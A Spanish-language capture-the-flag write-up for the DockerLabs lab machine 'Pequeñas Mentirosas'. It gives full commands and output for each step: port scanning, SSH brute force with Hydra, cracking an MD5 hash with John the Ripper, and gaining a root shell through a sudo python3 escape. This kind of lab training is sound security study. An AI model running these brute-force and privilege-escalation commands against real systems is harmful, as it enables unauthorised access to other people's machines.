---
layout: post
title: "Writeup — Pequeñas Mentirosas (DockerLabs)"
date: 20/05/2026
categories: [CTF, DockerLabs]
tags: [ctf, dockerlabs, linux, nmap, gobuster, hydra, john, ssh, fuerza-bruta, escalada-de-privilegios, python, md5, facil]
---

**Plataforma:** DockerLabs  
**Dificultad:** Fácil  
**Autor:** beafn28  
**IP:** 172.17.0.2  
**Fecha:** 26/09/2024
  

---

## 1. Reconocimiento — Escaneo de puertos

Empezamos con un escaneo SYN stealth sobre todos los puertos TCP para descubrir los servicios expuestos.

```bash
nmap -p- --open -sS --min-rate=5000 -v -n -Pn 172.17.0.2 -oG ArchvioPorts
```

Puertos abiertos encontrados:

```
22/tcp  open  ssh
80/tcp  open  http
```

A continuación lanzamos detección de versiones sobre los puertos descubiertos:

```bash
nmap -p22,80 -sVC 172.17.0.2 -oN Targeted
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 (Debian)
```

**Conclusión:** Sistema operativo Linux (Debian). Versiones sin CVEs críticos evidentes. El vector de ataque estará en la aplicación web o en las credenciales.

---

## 2. Enumeración web

Accedemos a `http://172.17.0.2` y encontramos una pista directa en la página principal:

> **"Pista: Encuentra la clave para A en los archivos."**

Esto nos indica que existe un usuario `a` en el sistema y que su contraseña se encuentra en algún archivo del servidor.

---

## 3. Fuzzing de directorios

Lanzamos gobuster para descubrir recursos ocultos en el servidor web:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

```
/.hta          (Status: 403)
/.htaccess     (Status: 403)
/.htpasswd     (Status: 403)
/index.html    (Status: 200) [Size: 85]
/server-status (Status: 403)
```

No hay directorios o archivos accesibles de interés. La pista de la web apunta a que la contraseña se encuentra en el sistema de ficheros, no expuesta vía HTTP. Reorientamos el ataque hacia **fuerza bruta SSH** sobre el usuario `a`.

---

## 4. Fuerza bruta SSH

Con el usuario `a` identificado gracias a la pista, usamos Hydra con la wordlist `rockyou.txt` sobre el puerto 22:

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt -t 64 ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2  login: a  password: secret
1 of 1 target successfully completed, 1 valid password found
```

**Credenciales encontradas:**

| Campo      | Valor    |
|------------|----------|
| Usuario    | `a`      |
| Contraseña | `secret` |
| Servicio   | SSH :22  |

---

## 5. Acceso inicial

Con las credenciales obtenidas, establecemos la conexión SSH:

```bash
ssh a@172.17.0.2
```

```
a@172.17.0.2's password: secret

Linux cbcd8ff160f8 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC ...

a@cbcd8ff160f8:~$
```

Shell obtenida como usuario `a`.

---

## 6. Post-explotación — Enumeración interna

Comprobamos si el usuario `a` tiene privilegios sudo:

```bash
sudo -l
```

No se obtienen privilegios sudo para `a`. Exploramos el sistema de ficheros en busca de información útil:

```bash
ls /
ls -al /srv/
ls -al /srv/ftp/
```

Encontramos un directorio `/srv/ftp/` con varios archivos de interés:

```
cifrado_aes.enc
clave_aes.txt
clave_privada.pem
clave_publica.pem
hash_a.txt
hash_spencer.txt
mensaje_hash.txt
mensaje_rsa.enc
original_a.txt
pista_fuerza_bruta.txt
retos.txt
retos_asimetrico.txt
```

Leemos el hash del usuario `spencer`:

```bash
cat /srv/ftp/hash_spencer.txt
```

```
7c6a180b36896a0a8c02787eeafb0e4c
```

---

## 7. Crackeo del hash de spencer

Identificamos el tipo de hash con `hash-identifier`: el resultado apunta a **MD5**.

Usamos John the Ripper para crackearlo:

```bash
echo '7c6a180b36896a0a8c02787eeafb0e4c' > hash && john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash
```

```
password1        (?)
Session completed.
```

**Contraseña de spencer:** `password1`

---

## 8. Movimiento lateral — Usuario spencer

Con la contraseña obtenida, cambiamos al usuario `spencer`:

```bash
su spencer
# Password: password1
spencer@cbcd8ff160f8:~$
```

Acceso conseguido como `spencer`.

---

## 9. Escalada de privilegios — Root vía Python3

Comprobamos los permisos sudo de `spencer`:

```bash
sudo -l
```

```
User spencer may run the following commands on cbcd8ff160f8:
    (ALL) NOPASSWD: /usr/bin/python3
```

`spencer` puede ejecutar `python3` como root sin contraseña. Aprovechamos esto para lanzar una shell como root:

```bash
sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

```
root@cbcd8ff160f8:/home/spencer#
```

**¡Escalada completada! Shell obtenida como `root`.**

---

## Resumen

Pequeñas Mentirosas es una máquina de dificultad fácil que plantea una cadena de ataque completa. Tras descubrir los puertos 22 y 80 con nmap, la web revela directamente el nombre de usuario `a`, cuya contraseña se obtiene por fuerza bruta SSH con Hydra. Una vez dentro, la enumeración del directorio `/srv/ftp/` expone un hash MD5 del usuario `spencer` que John the Ripper crackea en segundos. El movimiento lateral a `spencer` desbloquea el vector final: permisos sudo sobre `python3` sin contraseña, lo que permite escapar a una shell de root con una sola línea. Una máquina muy recomendable para asentar el flujo básico de reconocimiento, enumeración y escalada en entornos Linux.
